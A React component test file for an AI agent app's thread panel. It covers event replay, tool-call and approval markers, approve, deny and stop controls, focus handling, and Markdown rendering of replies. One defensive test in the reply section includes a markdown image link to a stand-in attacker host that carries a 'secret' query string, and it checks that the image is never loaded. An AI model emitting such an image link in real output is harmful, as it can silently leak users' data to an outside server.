import { CallError, type Event } from "@kinby/contract"
import { type Answers, stubCaller, stubSubscriber } from "@kinby/contract/testing"
import { act, fireEvent, render, screen, waitFor, within } from "@testing-library/react"
import userEvent from "@testing-library/user-event"
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"

import { ThreadPanel } from "@/components/thread-panel"
import { threadList } from "@/lib/thread-list"

type Payload = Event["payload"]

/** A client of an instance whose socket is up, answering from `answers`. */
function instanceClient(answers: Answers = {}) {
  return {
    ...stubCaller(answers),
    ...stubSubscriber(),
    state: () => "connected" as const,
    onStateChange: () => () => {},
  }
}

/** Open thread t1 of Ada's instance, from a client that answers from `answers`. */
function openThread(answers: Answers = {}, client = instanceClient(answers)) {
  const rendered = render(<ThreadPanel client={client} threadId="t1" name="Ada" />)
  const subscription = () => {
    const latest = client.subscriptions.at(-1)
    if (latest === undefined) throw new Error("The panel did not subscribe.")
    return latest
  }
  /** What the panel called besides the header listing the threads. */
  const sent = () => client.calls.filter((call) => call.method !== "thread.list")
  return { client, sent, subscription, unmount: rendered.unmount }
}

/** The thread's events, numbered from 1 in the order given. */
function thread(...events: [turnId: string, payload: Payload][]): Event[] {
  return events.map(([turnId, payload], index) => ({
    sequence: index + 1,
    thread_id: "t1",
    turn_id: turnId,
    timestamp: "2026-09-28T10:00:00Z",
    payload,
  }))
}

const started = (message: string): Payload => ({
  type: "turn.started",
  message,
  model: "claude",
  origin: { kind: "user" },
})

const loading = () => screen.queryByRole("status", { name: "Loading the thread" })

describe("a thread's panel", () => {
  it("follows the thread after the sequence its store has, loading until the replay reaches the head", async () => {
    const events = thread(
      ["turn-1", started("Fix the runtime")],
      ["turn-1", { type: "message.delta", text: "On it." }],
    )
    const { client, subscription, unmount } = openThread()

    expect(subscription().params).toEqual({ thread_id: "t1", after_sequence: 0 })
    expect(loading()).not.toBeNull()

    await act(async () => {
      subscription().subscribed(2)
      subscription().deliver(events[0] as Event)
    })
    expect(loading()).not.toBeNull()

    await act(async () => subscription().deliver(events[1] as Event))
    expect(loading()).toBeNull()
    expect(screen.getByText("Fix the runtime")).toBeDefined()
    expect(screen.getByText("On it.")).toBeDefined()

    unmount()
    expect(subscription().cancelled).toBe(true)
    openThread({}, client)
    expect(subscription().params).toEqual({ thread_id: "t1", after_sequence: 2 })
  })

  it("marks who started each turn, each tool call's main argument and gate decision, and how the turn ended", async () => {
    const gated = (
      callId: string,
      name: string,
      action: "allow" | "deny",
      decidedBy: "policy" | "user",
      rule: string,
    ): Payload => ({
      type: "tool.gated",
      call_id: callId,
      name,
      action,
      decided_by: decidedBy,
      rule,
    })
    const call = (callId: string, name: string, args: Record<string, string>): Payload => ({
      type: "tool.call",
      call_id: callId,
      name,
      arguments: args,
    })
    const events = thread(
      ["turn-1", started("Fix the runtime")],
      ["turn-1", call("c1", "read", { path: "runtime.py" })],
      ["turn-1", call("c2", "write", { path: "notes.md", content: "…" })],
      ["turn-1", gated("c1", "read", "allow", "policy", "reads are allowed")],
      ["turn-1", gated("c2", "write", "deny", "policy", "read-only mode denies writes")],
      [
        "turn-1",
        {
          type: "tool.result",
          call_id: "c1",
          name: "read",
          output: "",
          error: false,
          duration_ms: 38,
        },
      ],
      ["turn-1", call("c3", "edit", { path: "runtime.py", old: "a", new: "b" })],
      ["turn-1", gated("c3", "edit", "allow", "user", "ask mode asks before writes")],
      ["turn-1", { type: "turn.completed", input_tokens: 1_200, output_tokens: 300 }],
      [
        "turn-2",
        {
          type: "turn.started",
          message: "Summarize the night's email",
          model: "claude",
          origin: { kind: "routine", name: "nightly-digest", trigger: "scheduled" },
        },
      ],
      [
        "turn-2",
        { type: "turn.failed", code: "BUDGET_EXCEEDED", message: "The steps budget ran out." },
      ],
      ["turn-3", started("Deploy it")],
      ["turn-3", { type: "turn.interrupted" }],
      ["turn-4", started("Deploy it now")],
      ["turn-4", call("c5", "read", { path: "deploy.log" })],
      ["turn-4", call("c4", "bash", { command: "make deploy" })],
      [
        "turn-4",
        {
          type: "approval.requested",
          approval_id: "a1",
          name: "bash",
          arguments: { command: "make deploy" },
          rule: "ask mode asks before commands",
        },
      ],
    )
    const { subscription } = openThread()

    await act(async () => {
      subscription().subscribed(events.length)
      for (const event of events) subscription().deliver(event)
    })

    for (const marker of [
      "read runtime.py · 38 ms",
      "write notes.md · denied by policy: read-only mode denies writes",
      "edit runtime.py · approved by you · running",
      "Done · 3 steps · 1,500 tokens",
      "Failed: The steps budget ran out. (BUDGET_EXCEEDED)",
      "Stopped",
      "read deploy.log · running",
      "bash make deploy · waiting for you",
      "Working",
    ]) {
      expect(screen.getByText(marker)).toBeDefined()
    }
    expect(screen.getAllByText(/^You ·/)).toHaveLength(3)
    expect(screen.getByText(/^Routine nightly-digest ·/)).toBeDefined()
  })

  it("marks a failed turn's end as destructive, and a done turn's as not", async () => {
    const events = thread(
      ["turn-1", started("Fix the runtime")],
      ["turn-1", { type: "turn.completed", input_tokens: 1_200, output_tokens: 300 }],
      ["turn-2", started("Fix it again")],
      [
        "turn-2",
        {
          type: "turn.failed",
          code: "BUDGET_EXCEEDED",
          message: "The turn exceeded the steps budget of 1.",
        },
      ],
    )
    const { subscription } = openThread()

    await act(async () => {
      subscription().subscribed(events.length)
      for (const event of events) subscription().deliver(event)
    })

    const variant = (text: string) =>
      screen.getByText(text).closest("[data-slot=marker]")?.getAttribute("data-variant")
    expect(variant("Failed: The turn exceeded the steps budget of 1. (BUDGET_EXCEEDED)")).toBe(
      "destructive",
    )
    expect(variant("Done · 0 steps · 1,500 tokens")).toBe("default")
  })

  it("marks how long a call you approved took once it ran", async () => {
    const events = thread(
      ["turn-1", started("Deploy it")],
      [
        "turn-1",
        { type: "tool.call", call_id: "c1", name: "bash", arguments: { command: "make deploy" } },
      ],
      [
        "turn-1",
        {
          type: "tool.gated",
          call_id: "c1",
          name: "bash",
          action: "allow",
          decided_by: "user",
          rule: "mode.ask.write",
        },
      ],
      [
        "turn-1",
        {
          type: "tool.result",
          call_id: "c1",
          name: "bash",
          output: "",
          error: false,
          duration_ms: 12,
        },
      ],
    )
    const { subscription } = openThread()
    await act(async () => {
      subscription().subscribed(events.length)
      for (const event of events) subscription().deliver(event)
    })

    expect(screen.getByText("bash make deploy · approved by you · 12 ms")).toBeDefined()
  })

  describe("a turn's recap", () => {
    const completed: Payload = { type: "turn.completed", input_tokens: 90, output_tokens: 10 }
    const recapped = (node: string | null): Payload => ({
      type: "memory.recapped",
      node,
      input_tokens: 40,
      output_tokens: 20,
    })
    const failed: Payload = {
      type: "warning",
      sources: ["recap"],
      message: "The turn recap failed: TimeoutError: the model did not answer",
    }
    /** The marker on the turn that asked `request`. */
    const recapOf = (request: string, marker: string) => {
      const turn = screen.getByText(request).closest("[data-slot=message-scroller-item]")
      if (!(turn instanceof HTMLElement)) throw new Error(`No turn asked ${request}.`)
      return within(turn).queryByText(marker)
    }

    it("ends each turn with what the recap left, once it reports", async () => {
      const events = thread(
        ["turn-1", started("Fix the runtime")],
        ["turn-1", completed],
        ["turn-2", started("Deploy it")],
        ["turn-2", completed],
        ["turn-3", started("Tidy the notes")],
        ["turn-3", completed],
        ["turn-4", started("Say hi")],
        ["turn-4", completed],
        // A recap runs after its turn, so it can report after the next turn has started.
        ["turn-1", recapped("2026-09-28-0192-fix-the-runtime")],
        ["turn-2", recapped(null)],
        ["turn-3", failed],
      )
      const { subscription } = openThread()

      await act(async () => {
        subscription().subscribed(events.length)
        for (const event of events) subscription().deliver(event)
      })

      expect(recapOf("Fix the runtime", "Recapped")).not.toBeNull()
      expect(recapOf("Deploy it", "No episode")).not.toBeNull()
      expect(recapOf("Tidy the notes", "Recap failed")).not.toBeNull()
      for (const marker of ["Recapped", "No episode", "Recap failed"]) {
        expect(recapOf("Say hi", marker)).toBeNull()
      }
      // The episode has no Memory page to open on yet.
      expect(screen.queryByRole("link")).toBeNull()
    })

    it("shows a recap that reports live, after the turn has completed", async () => {
      const events = thread(["turn-1", started("Fix the runtime")], ["turn-1", completed])
      const { subscription } = openThread()
      await act(async () => {
        subscription().subscribed(events.length)
        for (const event of events) subscription().deliver(event)
      })
      expect(screen.getByText("Done · 0 steps · 100 tokens")).toBeDefined()
      expect(screen.queryByText("No episode")).toBeNull()

      await act(async () =>
        subscription().deliver({
          sequence: 3,
          thread_id: "t1",
          turn_id: "turn-1",
          timestamp: "2026-09-28T10:00:30Z",
          payload: recapped(null),
        }),
      )

      expect(screen.getByText("No episode")).toBeDefined()
    })

    it("shows why the recap failed on hover of its marker, a button", async () => {
      const events = thread(
        ["turn-1", started("Fix the runtime")],
        ["turn-1", completed],
        ["turn-1", failed],
      )
      const { subscription } = openThread()
      await act(async () => {
        subscription().subscribed(events.length)
        for (const event of events) subscription().deliver(event)
      })
      expect(screen.queryByText(/TimeoutError/)).toBeNull()

      await userEvent.hover(screen.getByRole("button", { name: "Recap failed" }))

      expect(
        await screen.findByText("The turn recap failed: TimeoutError: the model did not answer"),
      ).toBeDefined()
    })
  })

  describe("a turn the URL names", () => {
    const turns = ["turn-1", "turn-2", "turn-3"]

    // jsdom lays nothing out and cannot scroll. Here each turn stands 1,000 px tall below the one
    // before it, scrolling the transcript moves them up, and the thread opens on the last at 2,000.
    beforeEach(() => {
      vi.spyOn(Element.prototype, "getBoundingClientRect").mockImplementation(function (
        this: Element,
      ) {
        const index = turns.indexOf(this.getAttribute("data-message-id") ?? "")
        if (index === -1) return DOMRect.fromRect()
        const scrolled = this.closest("[data-slot=message-scroller-viewport]")?.scrollTop ?? 0
        return DOMRect.fromRect({ y: index * 1_000 - scrolled, height: 1_000 })
      })
      Object.defineProperty(Element.prototype, "scrollTo", {
        configurable: true,
        value(this: Element, { top = 0 }: ScrollToOptions) {
          this.scrollTop = top
        },
      })
    })

    afterEach(() => {
      vi.restoreAllMocks()
      Reflect.deleteProperty(Element.prototype, "scrollTo")
    })

    /** Open the thread at `path` and replay its three turns, then say where the transcript sits. */
    async function scrolledAt(path: string) {
      window.history.replaceState(null, "", path)
      const { subscription } = openThread()
      const events = thread(...turns.map((turn): [string, Payload] => [turn, started(turn)]))
      await act(async () => {
        subscription().subscribed(events.length)
        for (const event of events) subscription().deliver(event)
      })
      return screen.getByRole("region", { name: "Messages" }).scrollTop
    }

    it("opens the thread scrolled to that turn, not the latest", async () => {
      expect(await scrolledAt("/instances/hub-ada/threads/t1/turns/turn-2")).toBe(1_000)
    })

    it("opens the thread on its latest turn when the thread has no such turn", async () => {
      expect(await scrolledAt("/instances/hub-ada/threads/t1/turns/turn-9")).toBe(2_000)
    })

    it("leaves a thread opened without a turn on its latest turn", async () => {
      expect(await scrolledAt("/instances/hub-ada/threads/t1")).toBe(2_000)
    })
  })

  it("puts focus in the composer once the replay has loaded", async () => {
    const { subscription } = openThread()

    await act(async () => subscription().subscribed(0))

    expect(document.activeElement).toBe(screen.getByRole("textbox", { name: "Message Ada" }))
  })

  it("lines up the instance's name the same in a turn of only tool steps as in one with text", async () => {
    const events = thread(
      ["turn-1", started("List the repo")],
      ["turn-1", { type: "tool.call", call_id: "c1", name: "bash", arguments: { command: "ls" } }],
      ["turn-2", started("Say hi")],
      ["turn-2", { type: "message.delta", text: "Hi." }],
    )
    const { subscription } = openThread()
    await act(async () => {
      subscription().subscribed(events.length)
      for (const event of events) subscription().deliver(event)
    })
    // jsdom has no Tailwind, so read the paddings the header's classes can resolve to.
    const paddings = (header: HTMLElement) =>
      new Set([...header.classList].flatMap((name) => /(?:^|:)px-(.+)$/.exec(name)?.[1] ?? []))

    const [toolsOnly, withText] = screen.getAllByText("Ada")

    expect(paddings(toolsOnly as HTMLElement)).toEqual(new Set(["0"]))
    expect(paddings(withText as HTMLElement)).toEqual(new Set(["0"]))
  })

  it("starts a turn with the message when Enter is pressed", async () => {
    const { sent, subscription } = openThread({
      "thread.turn.start": () => ({ sequence: 1, thread_id: "t1", turn_id: "turn-1" }),
    })
    await act(async () => subscription().subscribed(0))
    const user = userEvent.setup()

    await user.type(screen.getByRole("textbox", { name: "Message Ada" }), "Fix the runtime{Enter}")

    expect(sent()).toEqual([
      { method: "thread.turn.start", params: { thread_id: "t1", message: "Fix the runtime" } },
    ])
    expect(screen.getByRole<HTMLTextAreaElement>("textbox", { name: "Message Ada" }).value).toBe("")
  })

  it("turns Send into Stop while a turn runs, and Stop interrupts the turn", async () => {
    const events = thread(
      ["turn-1", started("Deploy it")],
      ["turn-1", { type: "turn.interrupted" }],
    )
    const { sent, subscription } = openThread({
      "thread.turn.interrupt": () => ({ sequence: 2, thread_id: "t1", turn_id: "turn-1" }),
    })
    await act(async () => {
      subscription().subscribed(0)
      subscription().deliver(events[0] as Event)
    })
    const user = userEvent.setup()

    expect(screen.queryByRole("button", { name: "Send" })).toBeNull()
    await user.click(screen.getByRole("button", { name: "Stop" }))
    expect(sent()).toEqual([{ method: "thread.turn.interrupt", params: { thread_id: "t1" } }])

    await act(async () => subscription().deliver(events[1] as Event))
    expect(screen.queryByRole("button", { name: "Stop" })).toBeNull()
    expect(screen.getByRole("button", { name: "Send" })).toBeDefined()
  })

  describe("a waiting approval", () => {
    const parked = thread(
      ["turn-1", started("Deploy it")],
      [
        "turn-1",
        { type: "tool.call", call_id: "c1", name: "bash", arguments: { command: "make deploy" } },
      ],
      [
        "turn-1",
        {
          type: "approval.requested",
          approval_id: "a1",
          name: "bash",
          arguments: { command: "make deploy" },
          rule: "mode.ask.write",
        },
      ],
    )
    const accepted = () => ({ sequence: 3, thread_id: "t1", turn_id: "turn-1" })

    /** Reopen the thread with its replay parked on approval a1. */
    async function reopenParked(answers: Answers = {}) {
      const opened = openThread({
        "thread.approval.respond": accepted,
        "thread.turn.interrupt": accepted,
        ...answers,
      })
      await act(async () => {
        opened.subscription().subscribed(parked.length)
        for (const event of parked) opened.subscription().deliver(event)
      })
      return opened
    }

    it("marks the answer pressed while it is out, and shows why once it fails", async () => {
      let fail = (_error: CallError) => {}
      const { subscription } = openThread(
        {},
        {
          ...instanceClient(),
          call: () => new Promise<never>((_resolve, reject) => (fail = reject)),
        },
      )
      await act(async () => {
        subscription().subscribed(parked.length)
        for (const event of parked) subscription().deliver(event)
      })
      const button = (name: string) =>
        screen.getByRole<HTMLButtonElement>("button", { name: new RegExp(name) })

      await userEvent.setup().click(button("Approve"))

      expect(["Approve", "Deny", "Stop the turn"].map((name) => button(name).disabled)).toEqual([
        true,
        true,
        true,
      ])
      expect(within(button("Approve")).getByRole("status")).toBeDefined()
      expect(within(button("Deny")).queryByRole("status")).toBeNull()

      await act(async () =>
        fail(
          new CallError({
            code: "CONNECTION_LOST",
            message: "The connection to the instance dropped.",
            retryable: true,
          }),
        ),
      )

      expect(screen.getByRole("alert").textContent).toContain(
        "The connection to the instance dropped.",
      )
      expect(within(button("Approve")).queryByRole("status")).toBeNull()
      expect(button("Approve")).toHaveProperty("disabled", false)
    })

    it("takes the composer's place with the tool, its main argument, the rule, and the arguments", async () => {
      await reopenParked()
      const approval = screen.getByRole("region", { name: "Approve bash make deploy?" })

      expect(screen.queryByRole("textbox", { name: "Message Ada" })).toBeNull()
      expect(screen.queryByRole("button", { name: "Send" })).toBeNull()
      expect(approval.textContent).toContain("mode.ask.write")
      expect(approval.textContent).toContain('"command": "make deploy"')
    })

    it("puts focus in the reason when the thread opens on it", async () => {
      await reopenParked()

      expect(document.activeElement).toBe(screen.getByRole("textbox", { name: "Reason" }))
    })

    it("approves it", async () => {
      const { sent } = await reopenParked()

      await userEvent.setup().click(screen.getByRole("button", { name: "Approve" }))

      expect(sent()).toEqual([
        {
          method: "thread.approval.respond",
          params: { thread_id: "t1", approval_id: "a1", decision: "approve" },
        },
      ])
    })

    it("denies it with the reason typed", async () => {
      const { sent } = await reopenParked()
      const user = userEvent.setup()

      await user.type(screen.getByRole("textbox", { name: "Reason" }), "  Use staging instead ")
      await user.click(screen.getByRole("button", { name: "Deny" }))

      expect(sent()).toEqual([
        {
          method: "thread.approval.respond",
          params: {
            thread_id: "t1",
            approval_id: "a1",
            decision: "deny",
            reason: "Use staging instead",
          },
        },
      ])
    })

    it("denies it with the reason typed when Enter is pressed, once", async () => {
      const { sent } = await reopenParked()

      await userEvent
        .setup()
        .type(screen.getByRole("textbox", { name: "Reason" }), "Use staging instead{Enter}{Enter}")

      expect(sent()).toEqual([
        {
          method: "thread.approval.respond",
          params: {
            thread_id: "t1",
            approval_id: "a1",
            decision: "deny",
            reason: "Use staging instead",
          },
        },
      ])
    })

    it("does not deny while an input method is composing the reason", async () => {
      const { sent } = await reopenParked()

      fireEvent.keyDown(screen.getByRole("textbox", { name: "Reason" }), {
        key: "Enter",
        isComposing: true,
      })

      expect(sent()).toEqual([])
    })

    it("denies it without a reason when none is typed", async () => {
      const { sent } = await reopenParked()

      await userEvent.setup().click(screen.getByRole("button", { name: "Deny" }))

      expect(sent()).toEqual([
        {
          method: "thread.approval.respond",
          params: { thread_id: "t1", approval_id: "a1", decision: "deny" },
        },
      ])
    })

    it("stops the turn instead", async () => {
      const { sent } = await reopenParked()

      await userEvent.setup().click(screen.getByRole("button", { name: "Stop the turn" }))

      expect(sent()).toEqual([{ method: "thread.turn.interrupt", params: { thread_id: "t1" } }])
    })

    it("marks the call as not run when the turn stops, live and on replay", async () => {
      const { subscription, unmount } = await reopenParked()
      const stopped: Event = {
        sequence: 4,
        thread_id: "t1",
        turn_id: "turn-1",
        timestamp: "2026-09-28T10:00:00Z",
        payload: { type: "turn.interrupted" },
      }

      await act(async () => subscription().deliver(stopped))
      expect(screen.getByText("bash make deploy · not run, turn stopped")).toBeDefined()

      unmount()
      const reopened = openThread()
      await act(async () => {
        reopened.subscription().subscribed(stopped.sequence)
        for (const event of [...parked, stopped]) reopened.subscription().deliver(event)
      })
      expect(screen.getByText("bash make deploy · not run, turn stopped")).toBeDefined()
    })

    it("marks the call as not run when the turn fails", async () => {
      const { subscription } = await reopenParked()

      await act(async () =>
        subscription().deliver({
          sequence: 4,
          thread_id: "t1",
          turn_id: "turn-1",
          timestamp: "2026-09-28T10:00:00Z",
          payload: { type: "turn.failed", code: "INTERNAL", message: "The runner crashed." },
        }),
      )

      expect(screen.getByText("bash make deploy · not run, turn failed")).toBeDefined()
    })

    /** The event that moves the turn on once the user denied a1 for `reason`. */
    const denied = (reason: string): Event => ({
      sequence: 4,
      thread_id: "t1",
      turn_id: "turn-1",
      timestamp: "2026-09-28T10:00:00Z",
      payload: {
        type: "tool.gated",
        call_id: "c1",
        name: "bash",
        action: "deny",
        decided_by: "user",
        rule: "mode.ask.write",
        reason,
      },
    })

    it("gives the composer back once the turn moves on", async () => {
      const { subscription } = await reopenParked()

      await act(async () => subscription().deliver(denied("Use staging instead")))

      expect(screen.queryByRole("region", { name: "Approve bash make deploy?" })).toBeNull()
      expect(screen.getByRole("textbox", { name: "Message Ada" })).toBeDefined()
      expect(
        screen.getByText("bash make deploy · denied by you: Use staging instead"),
      ).toBeDefined()
    })

    it("returns focus to the composer once the answered approval clears", async () => {
      const { subscription } = await reopenParked()

      await userEvent.setup().click(screen.getByRole("button", { name: "Deny" }))
      await act(async () => subscription().deliver(denied("")))

      expect(document.activeElement).toBe(screen.getByRole("textbox", { name: "Message Ada" }))
    })

    it("leaves focus in the title being renamed when the approval clears", async () => {
      const { client, subscription } = await reopenParked({
        "thread.list": () => ({
          threads: [
            {
              id: "t1",
              title: "Deploy notes",
              created_at: "2026-09-28T10:00:00Z",
              last_activity_at: "2026-09-28T10:00:00Z",
              status: "awaiting_approval",
              mode: "ask",
              mode_pinned: false,
            },
          ],
          ceiling: "full-access",
        }),
      })
      await act(() => threadList(client).list())
      const user = userEvent.setup()

      await user.click(screen.getByRole("button", { name: "Deploy notes" }))
      await user.type(screen.getByRole("textbox", { name: "Thread title" }), " for staging")
      await act(async () => subscription().deliver(denied("")))

      expect(document.activeElement).toBe(screen.getByRole("textbox", { name: "Thread title" }))
    })
  })

  describe("a reply", () => {
    /** Open a thread whose one turn asked `request` and was answered with `reply`. */
    async function replied(request: string, reply: string) {
      const events = thread(
        ["turn-1", started(request)],
        ["turn-1", { type: "message.delta", text: reply }],
      )
      const { subscription } = openThread()
      await act(async () => {
        subscription().subscribed(events.length)
        for (const event of events) subscription().deliver(event)
      })
      return screen.getByText("Ada").parentElement as HTMLElement
    }

    it("renders its Markdown", async () => {
      const reply = await replied("Explain it", "The **runtime** reads `config.toml` first.")

      expect(reply.querySelector("strong")?.textContent).toBe("runtime")
      expect(reply.querySelector("code")?.textContent).toBe("config.toml")
      expect(reply.textContent).not.toContain("**")
      expect(reply.textContent).not.toContain("`")
    })

    it("renders a reply cut off mid-emphasis without the open marker", async () => {
      const reply = await replied("Explain it", "The **runtime reads")

      expect(reply.querySelector("strong")?.textContent).toBe("runtime reads")
      expect(reply.textContent).not.toContain("**")
    })

    it("renders a reply cut off inside a code fence without the fence", async () => {
      const reply = await replied("Show it", "Run this:\n\n```sh\nmake deploy")

      expect(reply.querySelector("pre")?.textContent).toContain("make deploy")
      expect(reply.textContent).not.toContain("```")
    })

    it("highlights the syntax of a fenced code block", async () => {
      const reply = await replied("Show it", "```python\nimport os\n```")

      await waitFor(() => {
        const keyword = [...reply.querySelectorAll("pre span")].find(
          (token) => token.textContent === "import",
        )
        expect(keyword?.getAttribute("style")).toContain("--sdm-c")
      })
    })

    it("leaves the request as typed", async () => {
      await replied("Deploy **now**, not `later`", "Deploying.")

      expect(screen.getByText("Deploy **now**, not `later`")).toBeDefined()
    })

    it("shows raw HTML as text", async () => {
      const reply = await replied("Explain it", "Use <b>bold</b> sparingly.")

      expect(reply.querySelector("b")).toBeNull()
      expect(reply.textContent).toContain("Use <b>bold</b> sparingly.")
    })

    it("loads no image it links to", async () => {
      const reply = await replied("Explain it", "Done. ![pixel](https://evil.example/?q=secret)")

      expect(reply.querySelector("img")).toBeNull()
      expect(reply.textContent).toContain("Done.")
    })

    it("opens its links in a new tab", async () => {
      await replied("Where is it?", "See [the docs](https://kinby.dev/docs).")

      const link = screen.getByRole("link", { name: "the docs" })
      expect(link.getAttribute("href")).toBe("https://kinby.dev/docs")
      expect(link.getAttribute("target")).toBe("_blank")
    })
  })

  it("says why a thread it cannot follow did not load", async () => {
    const { subscription } = openThread()

    await act(async () =>
      subscription().fail(
        new CallError({ code: "NOT_FOUND", message: "No thread t1.", retryable: false }),
      ),
    )

    expect(loading()).toBeNull()
    expect(screen.getByRole("alert").textContent).toContain("No thread t1.")
  })
})
